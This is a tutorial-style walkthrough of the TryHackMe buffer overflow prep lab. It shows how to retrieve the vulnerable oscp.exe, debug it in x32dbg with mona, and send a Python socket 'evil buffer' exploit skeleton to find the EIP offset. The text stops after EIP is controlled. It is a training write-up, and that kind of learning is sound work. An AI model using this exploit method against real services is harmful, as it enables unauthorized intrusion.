# Introduction
We'll be solving 3 tryhackme's stack buffer overflows from 0.

First of all, the web mentioned: https://tryhackme.com/room/bufferoverflowprep

We'll just take three of ten tasks.

On your Windows virtual machine, download the OpenVPN app and your config file and connect to the TryHackMe lab.
We're using Windows to use the next debugger: https://github.com/therealdreg/x64dbg-exploiting

# Preparation
Now, download wfreerdp from: https://ci.freerdp.com/job/freerdp-nightly-windows/arch=win32,label=vs2013/

[![7eaca6a835462d61e6e728ee31e68002.png](https://i.postimg.cc/FzGDXYrC/7eaca6a835462d61e6e728ee31e68002.png)](https://postimg.cc/ZvBrrKy6)

Use this to get the files we need from the tryhackme's lab:

1- Open a cmd.

2- Go to the wfreerdp.exe location.

3- Execute the next command, and wait it to prompt: ```wfreerdp.exe /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea```

[![f5c01f04067b7dfd594707974a929134.png](https://i.postimg.cc/2SXj8G9r/f5c01f04067b7dfd594707974a929134.png)](https://postimg.cc/mPCWmYG5)

We're in!

Now compress the folder named: ```vulnerable-apps```, it should be like this: ```vulnerable-apps.zip```

Open a cmd, go to Desktop and open a python server: ```c:\Python27\python.exe -m SimpleHTTPServer```

[![735d39e14aff853c4697b71bf50489c1.png](https://i.postimg.cc/bw60YXjr/735d39e14aff853c4697b71bf50489c1.png)](https://postimg.cc/PCwvKRJn)

In our Windows host, go to ```http://MACHINE_IP:8000/vulnerable-apps.zip``` and that's it, we have everything we need.

# Using x32dbg

Open x32dbg.exe and open the ```oscp.exe``` included in the ```vulnerable-apps``` folder.

[![fe4c3e7b918b16a6f0426d7cf74babd2.png](https://i.postimg.cc/8zmDnrYQ/fe4c3e7b918b16a6f0426d7cf74babd2.png)](https://postimg.cc/Yv0Jvjkb)

Once opened, make some clicks until we ensure the program is running succesfully.

It should be like this:

[![bc23c133126932d97e13e5224d94db87.png](https://i.postimg.cc/PJQ2kTnx/bc23c133126932d97e13e5224d94db87.png)](https://postimg.cc/ct6QRqHy)

Open your notepad (classic Windows NotePad or NotePad ++, it doesn't matter) and copy this script to exploit the ```oscp.exe```:

```
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

We're ready to exploit.

# Exploiting OVERFLOW1

With our copied script, rename it as ```exploit1.py``` 

We need to import mona and its config with the next command line:

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
```

NOTE: We need to use this command line everytime we reboot our Windows!

First of all we're going to fill the stack with a cyclic pattern to see where the EIP is.

Before this, go to ```log``` and at the command line paste: ```mona.mona("pattern_create 2000")```

It will create a cyclic pattern of 2000, open your ```exploit.py``` and paste it at the ```payload``` line.

[![a8ecdbefeaba0a391173003b2ddd8413.png](https://i.postimg.cc/153nyspq/a8ecdbefeaba0a391173003b2ddd8413.png)](https://postimg.cc/xqBTRrpf)

[![29de62a2769cf27ea4601fae99796222.png](https://i.postimg.cc/C1v07Td3/29de62a2769cf27ea4601fae99796222.png)](https://postimg.cc/Vrb2shqg)

Save your script and run it with python3: ```python3 exploit.py``` Give it many tries until x32dbg receive the response.

NOTE: Sometimes programs might crash if we use a big pattern, give it some tries if it happens with lower patterns.

Once it receives our exploit, see where EIP is, mine is: ```6F43396E```

[![eba3a8e41c04dccfab085ba93fd2a3aa.png](https://i.postimg.cc/zf83PNXv/eba3a8e41c04dccfab085ba93fd2a3aa.png)](https://postimg.cc/68b9yDZx)

Then make a search of the pattern indicating EIP: ```mona.mona("pattern_offset EIP")```

Great! We have 1978 A's until EIP. Now fill the EIP with 4 B's (insert them at the ```retn``` line)

[![99559cf5d7b79579757cffd6e3acfef8.png](https://i.postimg.cc/65pkcmXK/99559cf5d7b79579757cffd6e3acfef8.png)](https://postimg.cc/BtR7QNb7)

Save your script and restart your x32dbg.

NOTE: Everytime you modify and run the program you must restart!

[![fd93562e56d146d6650aa3da1887ef18.png](https://i.postimg.cc/NMP6cF5p/fd93562e56d146d6650aa3da1887ef18.png)](https://postimg.cc/62n2V9Vv)

EIP has the B's in it! And we are right at the top of the stack (```ESP```)

[![8c085382a900fc64f7b2af19c23e0001.png](https://i.postimg.cc/qRf6rFr6/8c085382a900fc64f7b2af19c23e0001.png)](https://postimg.cc/yJP8Xvk7)

